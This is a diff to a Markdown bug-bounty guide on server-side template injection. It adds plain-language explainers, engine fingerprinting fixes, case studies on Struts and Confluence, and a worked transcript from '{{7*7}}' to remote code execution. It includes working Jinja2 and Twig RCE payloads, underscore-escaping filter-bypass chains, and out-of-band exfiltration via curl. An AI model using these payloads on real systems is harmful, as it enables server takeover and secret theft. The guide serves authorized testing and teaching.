@@ -55,11 +55,13 @@
 18. [Building a Professional, Safe PoC](#18-building-a-professional-safe-poc)
 19. [Reporting, CWE/CVSS & De-duplication](#19-reporting-cwecvss--de-duplication)
 20. [Automation & Red-Team Notes](#20-automation--red-team-notes)
+21. [Real-World Case Studies (Verified)](#21-real-world-case-studies-verified)
 
 **Appendices**
 - [Appendix A — SSTI Workflow Cheat Sheet](#appendix-a--ssti-workflow-cheat-sheet)
 - [Appendix B — SSTI Decision Tree](#appendix-b--ssti-decision-tree)
 - [Appendix C — Important Links](#appendix-c--important-links)
+- [Appendix D — Worked End-to-End Transcript (`{{7*7}}` → RCE)](#appendix-d--worked-end-to-end-transcript-77--rce)
 
 ---
 
@@ -117,6 +119,8 @@ python3 SSTImap/SSTImap.py -u "https://target/profile?name=test"        # automa
 # 2. SSTI Anatomy
 
 ## 2.1 What it is
+> 🔰 **In plain words — the anchor for this whole kit.** A template engine is a **mail-merge / form-letter machine**: it holds a letter with blanks (`Dear ___, your invoice is ___`) and drops your data into the blanks. Normally *your input is only the filling* (data) — the machine prints it and moves on. **SSTI is when your input stops being the filling and becomes part of the letter's *instructions*.** And a template's instructions aren't just text — they can do math, read the program's objects, and (on most server engines) **run operating-system commands**. So when you type `{{7*7}}` into your "name" and the page answers `49`, the machine didn't print your text — it **obeyed** it. That's the whole game: your goal is to prove the machine is *executing* what you write, figure out *which* machine it is, and walk from `49` up to running `id` on the server. `{{7*7}}=49` is the doorbell; **RCE is the house.**
+
 A template engine turns a template + data into output. If **user input becomes part of the template** (not just the data), the engine **evaluates** your input as a template expression. Expressions can read objects, call methods, and — in most server engines — reach the OS → **RCE**.
 ```python
 # vulnerable: user input concatenated INTO the template string
@@ -126,6 +130,7 @@ render_template_string("Hello {{ name }}", name=request.args['name'])  # name={{
 ```
 
 ## 2.2 SSTI vs CSTI vs XSS vs plain reflection (know which you have)
+> **In plain words:** four different things can make `{{7*7}}` turn into `49`, and only ONE of them pays like a Critical. Ask *who* did the math and *where*. If the **server** did it (the `49` is already in the raw response before any JavaScript runs) → that's SSTI, ceiling is RCE, **this kit**. If the **browser** did it (the raw `{{7*7}}` arrived and JavaScript turned it into `49`) → that's a client-side framework like Angular/Vue → it's really XSS → **XSS kit**. If your text is just echoed into the page and runs as script → plain XSS. If `{{7*7}}` comes back *literally* as `7*7` → nobody evaluated it → nothing. Getting this wrong is the #1 way SSTI reports get closed, so settle it before you celebrate.
 ```
 SSTI  → SERVER template evaluates your expression (math runs server-side, no JS). → RCE.  (this kit)
 CSTI  → CLIENT framework (Angular/Vue) evaluates {{}} in the browser.             → XSS.   (XSS kit)
@@ -134,6 +139,7 @@ Reflection → input echoed but NOT evaluated (7*7 stays "7*7").                
 ```
 
 ## 2.3 Where SSTI sinks live
+> **In plain words:** SSTI lives wherever the app lets *you* supply text that it later *formats into something* — and the richest spots are the ones that scream "template": any feature that says "use `{{variables}}` in your email/invoice/notification" is a template engine wearing a name tag. But it also hides in humble places: a profile name echoed back, an email subject line, a support-ticket field a staff member views later. The last kind is the sleeper — your text renders *out of your sight* (in an email, a PDF, an admin panel), which is **blind SSTI** (§13).
 ```
 □ "Customize" features:   email/notification templates, invoice/report/PDF templates, page/site builders, themes.
 □ Reflected fields:       name/username/profile/bio rendered back; subject lines; error messages that template input.
@@ -172,11 +178,13 @@ Reflection → input echoed but NOT evaluated (7*7 stays "7*7").                
 
 **This is the make-or-break step.** Prove a **server** engine evaluated your input — and kill the false positives.
 
+> **In plain words:** before anything else, prove the *server* actually did the math — because `49` is a liar. It can be a coincidence (the page already had "49" or "7" somewhere), it can be the browser's JavaScript (CSTI, not yours to claim as RCE), or it can be plain reflection. The trick is to ask a question the page *cannot* answer by accident: `{{1337*1338}}`. If `1788906` comes back, the page couldn't have had that number lying around — a real engine computed it. Pair it with `{{7*'7'}}` (a string times a number), because a genuine engine does something *weird but consistent* with that (Jinja/Twig print `7777777`), which reflection never would. Two odd answers that both make engine-sense = confirmed. One round number = keep probing.
+
 ## 4.1 The differential probe (low false-positive)
 Don't trust a lone `{{7*7}}=49`. Use **two** linked probes with **non-round** operands so a coincidence is implausible:
 ```
 Probe A (numeric):  {{1337*1338}}     → 1788906   (engine did arithmetic)
-Probe B (string):   {{7*'7'}}         → 7777777   (Jinja2/Twig string-multiply)  OR  49 (others)  OR error
+Probe B (string):   {{7*'7'}}         → 7777777   (JINJA2 only — Python string-repeat)  OR  49 (Twig/PHP & numeric engines)  OR error
 Confirm: BOTH behave like an engine (A computes the product; B either string-multiplies or computes) AND the literal
          text "{{1337*1338}}" does NOT appear → it's SSTI.
 ```
@@ -197,7 +205,7 @@ ${{<%[%'"}}%\        ← classic detection polyglot; an error or partial-eval fl
 
 ## 4.3 Note what you'll need next
 - **Which delimiter** evaluated (`{{ }}` vs `${ }` vs `<%= %>` vs `{ }`) → narrows the engine (§5).
-- **String-multiply behavior** (`7*'7'`→`7777777`) → Jinja2/Twig family; `49`/error → others.
+- **String-multiply behavior** (`7*'7'`→`7777777`) → **Jinja2** (Python string-repeat is Jinja-only); `7*'7'`→`49` → Twig (PHP) or another numeric engine; error → others.
 - **Stack** (headers/errors) → Python/Java/PHP/Ruby/Node → which RCE chain.
 
 > **Don't report `{{7*7}}=49`.** By itself it's the #1 SSTI false positive. The finding starts at **"a server engine evaluated `1337*1338` to `1788906` and it's engine `X`."** Differentiate, fingerprint, then go to RCE.
@@ -210,13 +218,15 @@ ${{<%[%'"}}%\        ← classic detection polyglot; an error or partial-eval fl
 
 # 5. Engine Fingerprinting — the Decision Tree
 
+> **In plain words:** you've proven *a* machine is executing your text — now find out *which* machine, because every engine speaks a different dialect and the payload that pops a shell in Jinja2 just errors out in Twig or Freemarker. Think of it as identifying an accent: send a few phrases and listen to how each one comes back. Does `{{7*'7'}}` give `7777777`? (Jinja2 or Twig.) Does `${7*7}` work instead of `{{ }}`? (a Java engine.) Does `<%= 7*7 %>`? (Ruby ERB or Node EJS.) You're narrowing "some template engine" down to one exact name **before** you spend your attempts on RCE payloads.
+
 Send these and branch on what renders:
 ```
 {{7*7}} → 49 ?
-  ├─ {{7*'7'}} → 7777777 ?  → JINJA2 (Python) or TWIG (PHP). Distinguish:
-  │     {{7*'7'}}=7777777 AND {{config}} or {{self}} works → JINJA2.
-  │     {{_self}} / {{ '%07'|... }} / Twig-specific filters → TWIG.
-  └─ {{7*'7'}} → 49 (numeric) → likely a different family; check below.
+  ├─ {{7*'7'}} → 7777777 ?  → JINJA2 (Python). String-repeat (`int*str`) is PYTHON-ONLY, so 7777777 ≈ confirms Jinja2.
+  │     Confirm: {{config}} or {{self}} renders app config → JINJA2 locked.
+  └─ {{7*'7'}} → 49 (numeric) → TWIG (PHP) or another numeric engine (Twig runs on PHP → 7*'7'=49, NOT 7777777).
+        Confirm TWIG: {{_self}} / {{ '%07'|... }} / Twig-specific filters render.
 ${7*7} → 49 ?
   ├─ ${"z".join("ab")}-style / ${T(java...)} → JAVA SpEL / Thymeleaf.
   ├─ #{7*7} → 49 → Ruby (Slim) / Thymeleaf (#{}) → check.
@@ -229,7 +239,7 @@ No {{}}/${} but {%...%} errors → Jinja/Twig statement context.
 ```
 Use `poc/ssti_detect.py` which automates this branch and prints the most likely engine + confidence.
 
-> **If this → then that:** `{{7*'7'}}`=`7777777` → **Jinja2 or Twig**; then `{{config}}` rendering app config = **Jinja2** (Python). `${...}` with Java-ish behavior = **Freemarker/Velocity/SpEL**. `<%= %>` = **ERB/EJS**. Nail the engine *before* firing RCE payloads — the wrong engine's payload just errors and wastes your attempts.
+> **If this → then that:** `{{7*'7'}}`=`7777777` → **Jinja2** (Python string-repeat is Jinja-only; `{{config}}` then locks it). `{{7*7}}`=`49` but `{{7*'7'}}`=`49` → **Twig** (PHP) — confirm with `{{_self}}`/Twig filters. `${...}` with Java-ish behavior = **Freemarker/Velocity/SpEL**. `<%= %>` = **ERB/EJS**. Nail the engine *before* firing RCE payloads — the wrong engine's payload just errors and wastes your attempts.
 
 ---
 
@@ -251,6 +261,8 @@ Use `poc/ssti_detect.py` which automates this branch and prints the most likely 
 > Every PoC uses a **benign marker** (`id`/unique echo) on your **authorized** target; reverse shells only on explicitly authorized engagements; clean up (§18). Full per-engine strings in `SSTI_ARSENAL.md`.
 
 # 7. Python Engines → RCE
+
+> **In plain words:** here's the payoff — turning "the engine runs my text" into "the engine runs my *shell commands*." Jinja2 (Python's most common engine, used by Flask) doesn't hand you `os.system` directly, so you climb an **object staircase**: start from an object the template gives you for free (`cycler`, `lipsum`, `request`), hop through its hidden Python attributes (`.__globals__`) until you reach the `os` module, then call `.popen('id')`. It looks like gibberish, but it's just "from *this* object, find a door to the operating system." Paste one of the lines below; if `id` comes back (your user + groups), you have full RCE. If they're blocked, `{{config}}` alone often leaks Flask's `SECRET_KEY` — enough to forge admin login cookies (still High–Critical).
 
 ## 7.1 Jinja2 (Flask) — the classic
 ```
@@ -345,7 +357,7 @@ Sandbox (Jenkins script-security / Groovy sandbox):
 
 ## 9.1 Twig
 ```
-Confirm: {{7*7}}=49 , {{7*'7'}}=7777777 (like Jinja).
+Confirm: {{7*7}}=49 , {{7*'7'}}=49 (Twig runs on PHP → numeric coercion, NOT Jinja's 7777777) , {{_self}} / Twig filters render.
 RCE (modern Twig):
   {{ ['id']|filter('system') }}
   {{ ['id',''] | sort('system') }}
@@ -404,6 +416,8 @@ Velocity-on-Node / Marko: Marko compiles to JS → `constructor.constructor('ret
 
 # 11. Sandbox Escapes
 
+> **In plain words:** a *sandbox* is the engine's own bouncer — it tries to block the dangerous doors (`__class__`, `config`, `os`) so template authors can't reach the OS. But bouncers miss exits. The escape is to reach the same runtime through a door the bouncer *forgot* — a different built-in object (`cycler`/`namespace`), attribute-access spelled a different way (`|attr('__class__')` instead of `.__class__`), or the blocked word *smuggled in* through a URL parameter so it never appears in your template text. Treat "it's sandboxed" as a speed bump, not a wall: an escaped sandbox is **still Critical RCE**, and even a truly locked one usually still leaks file contents and secrets (§12).
+
 Some engines ship a **sandbox** that blocks dangerous attributes. Known escapes exist:
 ```
 Jinja2 sandbox:   reach builtins via objects the sandbox forgot to block — e.g. via {{ cycler }}/{{ joiner }}/{{ namespace }}
@@ -456,6 +470,8 @@ SECRETS: {{config}} (Flask SECRET_KEY → forge sessions), environment dumps, se
 ---
 
 # 13. Blind SSTI — Time & OOB Confirmation
+
+> **In plain words:** sometimes your text renders somewhere you *never see* — inside an email that gets mailed, a PDF that's generated in the background, an admin screen only staff open. You can't read `49` off a page that isn't shown to you, so you make the server *tell on itself* two other ways. **Time:** ask the engine to `sleep 10`; if the request takes ten seconds longer, something executed it. **OOB (out-of-band):** ask the engine to `curl` a URL you control; if your listener gets a hit *from the server's IP*, it ran your code — and you can even fold `$(whoami)` into that URL to smuggle the answer out. Bonus: these hidden back-office renderers often run with *higher privileges* than the public site.
 
 When the template renders where you can't see it (email/PDF/admin/queued job):
 ```
@@ -512,6 +528,8 @@ Confirm on **production** with a benign marker; differentiate from CSTI/reflecti
 ---
 
 # 16. Severity Calibration — how triagers really rate SSTI
+
+> **In plain words:** severity tracks *how close to the operating system you got*. Reached a shell (`id` runs) → **Critical**, full server compromise, and that's the *default* for server engines, so push for it. Sandbox stopped the shell but you read files or dumped `{{config}}` secrets → **High** (those secrets usually let you escalate anyway). Only made the engine fetch a URL → **High** via SSRF. And the two non-findings: a bare `{{7*7}}=49` isn't rated at all until you differentiate it, and a *client-side* `{{}}` isn't SSTI — it's XSS, rated in that kit. Report the impact you *proved*, not the one you hope is there.
 
 | Scenario | Typical | What moves it |
 |---|---|---|
@@ -623,6 +641,29 @@ nuclei -l live.txt -tags ssti -o ssti.txt
 
 ---
 
+# 21. Real-World Case Studies (Verified)
+
+> SSTI is young as a *named* class (2015) but its Expression-Language cousin (OGNL/SpEL/EL, §8.4) has caused some of the largest breaches in history — because a template/EL that evaluates attacker input is **pre-auth RCE**. These are documented, attributed cases; each maps to a technique in this guide. (Verify-before-write: every claim checked against primary sources, cited inline.)
+
+**① The origin — James Kettle names the class (2015). Why the methodology in this guide exists.**
+Before **James Kettle** (PortSwigger) presented **"Server-Side Template Injection: RCE for the Modern Web App"** at **Black Hat USA 2015**, template injection wasn't recognized as its own vulnerability class — it was misfiled as XSS or reflection. Kettle's research **coined the term "SSTI"** and laid out the exact polyglot methodology this kit teaches: **probe with arithmetic/operators → identify the engine from the response → climb the language's reflection API to a code-execution sink.** Every `{{7*7}}`→`49` you'll ever send traces to this paper. (He demonstrated it on real targets including Uber.)
+→ *Technique:* §4 (differential probe) → §5 (fingerprint) → §7–§10 (engine→RCE). *Lesson:* the whole discipline is "math to confirm, reflection to escalate."
+*Source:* [Black Hat USA 2015 — Kettle, Server-Side Template Injection](https://infocondb.org/con/black-hat/black-hat-usa-2015/server-side-template-injection-rce-for-the-modern-web-app) · [PortSwigger Research — SSTI](https://portswigger.net/research/server-side-template-injection)
+
+**② Apache Struts / Equifax — OGNL in a header → RCE → 147M records (2017, CVE-2017-5638). The most consequential EL injection ever.**
+Apache **Struts 2**'s Jakarta Multipart parser evaluated the HTTP **`Content-Type` header as an OGNL expression** when it was malformed — so a crafted `Content-Type:` containing an OGNL payload gave **unauthenticated RCE** (CVE-2017-5638, March 2017). Equifax failed to patch a public-facing app, and in 2017 attackers used exactly this bug to breach **~147 million** people's records — one of the largest, most consequential breaches in history. OGNL is the Java Expression Language this guide covers in **§8.4**; SSTI/EL injection is not academic — it is *the* Struts-Equifax bug.
+→ *Technique:* §8.4 (OGNL/EL injection), and §3's lesson that **headers are injection surface**. *Lesson:* an EL that evaluates any attacker input is pre-auth RCE; patch windows are measured in hours.
+*Source:* [Black Duck — CVE-2017-5638 explained](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html) · [Avatao — Deep dive: Equifax & the Struts vulnerability](https://avatao.com/blog-deep-dive-into-the-equifax-breach-and-the-apache-struts-vulnerability/)
+
+**③ Atlassian Confluence — unauth OGNL injection, mass-exploited 0-day (2022, CVE-2022-26134). The modern flagship.**
+In May 2022 **Volexity** found Confluence Server/Data Center servers compromised via an **unauthenticated OGNL injection**: a crafted **OGNL expression in the request URI** was evaluated by Confluence's EL interpreter, yielding **RCE as the Confluence user** (CVE-2022-26134, **CVSS 9.8**). Atlassian confirmed active exploitation on 2 June 2022; PoCs and mass-scanning followed within hours. It's the same §8.4 EL-injection mechanic as Struts, five years later, on a product in a huge fraction of enterprises — proof the class is *still* a top-tier, pre-auth RCE surface.
+→ *Technique:* §8.4 (OGNL/EL injection), §3 (known-product endpoints). *Lesson:* fingerprint the product; EL injection in enterprise Java software is a recurring, catastrophic pattern.
+*Source:* [Volexity — Zero-Day Exploitation of Confluence](https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/) · [Rapid7 — Active exploitation of CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
+
+**④ The meta-lesson.** Two of these three (Struts/Equifax, Confluence) were **unauthenticated, header/URI EL injections → RCE at internet scale**, five years apart — the same root cause the guide's §8.4 warns about. And the classic teaching engine, **Jinja2** (`{{config}}`/`{{7*7}}`), is the *same idea* in Python: a template that evaluates your input is RCE (or, one rung down, `SECRET_KEY` disclosure → forged admin sessions, §12/§17). Whether it's `{{...}}`, `${...}`, `%{...}`, or `#{...}`, the question is always Kettle's: *does the server evaluate my expression — and if so, how far up the reflection chain can I climb?*
+
+---
+
 # Appendix A — SSTI Workflow Cheat Sheet
 
 ```
@@ -664,7 +705,7 @@ Injected {{7*7}} / ${7*7} / <%=7*7%> / #{7*7} / {7*7} into a reflected field →
 │
 ├─ FINGERPRINT (§5):
 │     {{7*'7'}}=7777777 + {{config}} → JINJA2 (Python) → cycler/lipsum globals → os.popen('id'). CRITICAL ⭐
-│     {{7*'7'}}=7777777 + Twig filters → TWIG (PHP) → {{['id']|filter('system')}}. CRITICAL ⭐
+│     {{7*'7'}}=49 (numeric) + Twig filters/_self → TWIG (PHP) → {{['id']|filter('system')}}. CRITICAL ⭐
 │     ${...} + ?new() → FREEMARKER (Java) → Execute("id"). CRITICAL ⭐
 │     ${T(java...)} → SpEL/Thymeleaf → Runtime.exec("id"). CRITICAL ⭐
 │     <%= %> → ERB(Ruby) `id` / EJS(Node) process.mainModule.require. CRITICAL ⭐
@@ -702,6 +743,70 @@ CWE-1336 (Server-Side Template Injection)              https://cwe.mitre.org/dat
 CWE-94 (Improper Control of Code Generation)           https://cwe.mitre.org/data/definitions/94.html
 CVSS 3.1 calculator (SSTI→RCE ≈ 9.8 Critical)          https://www.first.org/cvss/calculator/3.1
 ```
+
+---
+
+# Appendix D — Worked End-to-End Transcript (`{{7*7}}` → RCE)
+
+> **What this shows.** The whole spine in one run — the [Master Testing Sequence](#master-testing-sequence--the-testing-order) in motion — on a fictional `https://app.example/greet?name=…` that echoes the name. It walks Kettle's methodology exactly (§21 ①): **polyglot to detect → arithmetic to confirm server-side eval → fingerprint the engine → climb the reflection API to RCE**, and it handles the **real-world filter reality** (many apps block `_`, `.`, or `[]`) instead of pretending the textbook payload always lands. Ends at a benign `id`, the complete Critical. Placeholders are benign; run only on your own lab / an authorized target.
+
+**Step 1 — recon + the polyglot probe (§3–§4).** Fire one payload that breaks *some* engine syntax, then read the response:
+
+```
+GET /greet?name=${{<%[%'"}}%\      → 500 template error  OR odd output  → template engine in the loop (worth pursuing)
+#   (a plain reflection just echoes the string verbatim with no error — that's XSS territory, not SSTI, §2.2)
+```
+
+**Step 2 — confirm SERVER-SIDE evaluation, differentially (§4 — the validity gate).** Math the server must compute, plus the control that proves it isn't reflection:
+
+```
+GET /greet?name={{7*7}}       → "Hello 49"          ← the server COMPUTED 49 = server-side evaluation
+GET /greet?name={{7*7}}       vs   name=7*7 (literal) → "49" vs "7*7"   ← differential: not reflection, real SSTI
+GET /greet?name=${7*7}        → "Hello ${7*7}" (unchanged)   ← this engine isn't ${}-syntax → narrows the engine
+```
+
+> **Validity gate (§14.2).** A lone `49` from `{{7*7}}` is necessary but not sufficient for a *report* — prove it's **server-side** (the differential vs the literal) and that it's not client-side `{{}}` (that's XSS). Only then is it SSTI.
+
+**Step 3 — fingerprint the engine (§5 — the decision tree).** `{{...}}` narrows it to Jinja2/Twig/Nunjucks/Handlebars; disambiguate:
+
+```
+GET /greet?name={{7*'7'}}     → "7777777"   ← string-repeat = Jinja2/Python (Twig would give 49; a number*string error rules others out)
+GET /greet?name={{7*'7'}}     (Twig →) 49    (Nunjucks →) error    → response tells you which. Here: 7777777 = JINJA2.
+```
+
+**Step 4 — climb the reflection API to RCE (§7.1 Jinja2).** The textbook chain first; if filtered, pivot:
+
+```
+# textbook (works when nothing is blocked):
+{{cycler.__init__.__globals__.os.popen('id').read()}}      → uid=33(www-data)...   = RCE
+# ── but the app blocks '_' and '.' (common WAF/sandbox) → the textbook payload 400s. Pivot to attribute-bypass: ──
+{{()|attr('\x5f\x5fclass\x5f\x5f')}}                        → hex-escape the blocked underscores (§11.1)
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+                                                            → uid=33(www-data)...   = RCE via |attr() + request object (no '.' , no '[]')
+```
+
+> **Filter-bypass reality (§11.1).** Real targets block `.`/`_`/`[]`/keywords. The escape ladder: `|attr()` instead of `.`, hex/unicode escapes (`\x5f`) for blocked chars, `request`-object gadgets (`request.application.__globals__`), and `{% ... %}` statement tags. Knowing this ladder is the difference between "I got `49`" and "I got a shell."
+
+**Step 5 — benign proof, then STOP (§12, §18).** One `id` is the whole Critical:
+
+```
+...popen('id').read()  → uid=33(www-data) gid=33(www-data) groups=33(www-data)     ← RCE proven. Stop.
+# If sandboxed (Jinja SandboxedEnvironment blocks the chain) → one rung down is still Critical/High:
+{{config}}  or  {{config.items()}}   → dumps SECRET_KEY → forge admin Flask session (§17), no RCE needed.
+```
+
+**Step 6 — report the impact (§19).** Lead with RCE, show the chain:
+
+```
+Title:  Server-Side Template Injection in `name` (Jinja2) → remote code execution
+Proof:  {{7*7}}=49 (differential vs literal 7*7) → {{7*'7'}}=7777777 (Jinja2 fingerprint) →
+        |attr()+request-object chain (underscores hex-escaped past the filter) → popen('id') = www-data.
+Impact: arbitrary code execution on the app server (Critical, CVSS 9.8, CWE-1336→CWE-94).
+Notes:  benign proof only (id), no persistence, no data read. If your instance sandboxes, {{config}} SECRET_KEY = admin-session forgery.
+Fix:    never render user input as a template; pass it as DATA/context; use a sandboxed engine + logic-less templates.
+```
+
+That is a full SSTI run: **§3 recon → §4 differential confirm → §5 fingerprint → §7.1 engine-specific RCE → §11.1 filter bypass → §19 report.** A "name" field became RCE — the exact arc (Kettle's methodology, §21 ①) that made Struts/Confluence (§21 ②③) internet-scale disasters, done ethically with one benign `id`.
 
 ---
 
